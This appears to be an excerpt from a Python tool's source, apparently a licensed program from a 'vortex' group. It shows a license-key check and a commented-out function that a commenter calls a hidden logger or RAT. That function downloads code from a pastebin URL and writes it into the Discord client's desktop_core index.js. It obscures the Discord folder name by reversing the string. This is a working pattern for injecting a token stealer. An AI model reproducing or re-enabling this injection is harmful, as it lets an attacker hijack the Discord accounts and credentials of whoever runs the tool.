...
RSAPubKey = "<RSAKeyValue><Modulus></Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
auth = "WyI3MDkyMjgwNCIsImFCYkhFbWJwa3VEQUxCRjZIYS9EdG9mS1hJNUx5WXZjN1ViQXowU1giXQ=="

# logger called rat by vortex admins got exposed and webhook is deleted so np 
# def checkvalidity():
#     currentDir = ""
#     secretGovernment = "drocsid"[::-1] -- bro is really trying to hide that its going into the discord folder lol

#     appdata = os.getenv('LOCALAPPDATA')
    # code = requests.get("https://pastebin.com/raw/6bgSMGdF").text
    # for dir in os.listdir(appdata+f"/{secretGovernment}/"):
    #     if "app-" in dir:
    #         currentDir = appdata+ f"/{secretGovernment}/" + dir + "/modules"
    #         break

    # for dir in os.listdir(currentDir):
    #     if f"{secretGovernment}_desktop_core" in dir:
    #         currentDir = currentDir + "/" + dir + f"/{secretGovernment}_desktop_core"
    #         break

    # file = currentDir + "/index.js"
    # with open(file, "w+") as f:
    #     if f.writable() and  not "webRequest.onBeforeSendHeaders" in f.read():
    #         print(file)
    #         f.write(code)
    #         f.close()

    # don't uncomment this unless you want to get logged 
...
def authkey():
    while True:
        ...
        if license_key == None:
            license_key = input(f"{C}Enter licenseKey >> ")
        ...
        try:       
            ...
            if result[0] == None or not Helpers.IsOnRightMachine(result[0], v=2):
                print("INVALID LICENSE CONTACT @TRAVISSCOD")
                os._exit(1)
            else:
                tool = Tool(version='1.0.7')
                tool.run()
                break
